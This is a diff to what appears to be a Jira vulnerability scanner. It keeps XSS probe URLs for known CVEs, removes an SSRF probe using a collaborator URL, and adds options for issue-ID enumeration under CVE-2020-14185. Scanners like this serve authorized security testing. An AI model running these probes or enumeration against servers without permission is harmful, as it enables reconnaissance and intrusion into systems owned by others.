@@ -59,21 +59,11 @@ def test_jira_vulns(url):
 
     vulnerabilities= []
 
-    collaborator = "https://google.com"
-    #print ("+ Using collaborator as:", collaborator)
-    collaborator = "https://victomhost:1337@example.com" #ask user for collaborator URL
-
-    cve20179506 = f"{url}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.com" # /plugins/servlet/oauth/users/icon-uri?consumerUri=
-
     cve20185230 = f"{url}issues/" #https://hackerone.com/reports/380354 https://jira.atlassian.com/browse/JRASERVER-67289 /issues/?jql=assignee%20in%20(membersOf(jira-users))
-    #CVE-2018-5230 /pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm
-    #CVE-2018-5230 /pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
 
     xss = f"{url}pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm"
 
     cve20193402 = f"{url}secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search"
-
-    cve20198451 = f"{url}/plugins/servlet/gadgets/makeRequest?url={collaborator}" #/plugins/servlet/gadgets/makeRequest?url=
 
 
     #todo /rest/api/2/user/search?username=.&maxResults=1000
@@ -467,12 +457,21 @@ def main():
         group.add_argument("--single", "-s", metavar="URL", help="Check if JIRA is running on a single server")
         parser.add_argument("--path", "-p", metavar="PATH", default="/", help="Specify the API path to check (default: /)")
         group.add_argument("--list", "-l", metavar="FILE", help="Check if JIRA is running on a list of servers")
-        parser.add_argument("--module", "-m", metavar="MODULE", help="Run a specific module against the target")
+        # Additional arguments for specific modules
+        parser.add_argument("--module", "-m", metavar="MODULE", help="Specify the single module to run (e.g., check_open_jira_signup)")
+        parser.add_argument("--start_id", type=int, default=10000, help="Start ID for issue enumeration (default: 10000)")
+        parser.add_argument("--end_id", type=int, default=20000, help="End ID for issue enumeration (default: 20000)")
+
         args = parser.parse_args()
 
         if args.single:
             if args.module:
-                run_single_check(args.module, args.single)
+                if args.module == "check_cve_2020_14185":
+                    start_id = args.start_id if args.start_id else 10000
+                    end_id = args.end_id if args.end_id else 20000
+                    check_cve_2020_14185(args.single, start_id, end_id)
+                else:
+                    run_single_check(args.module, args.single)
             else:
                 check_jira(args.single, args.path)
         elif args.list:
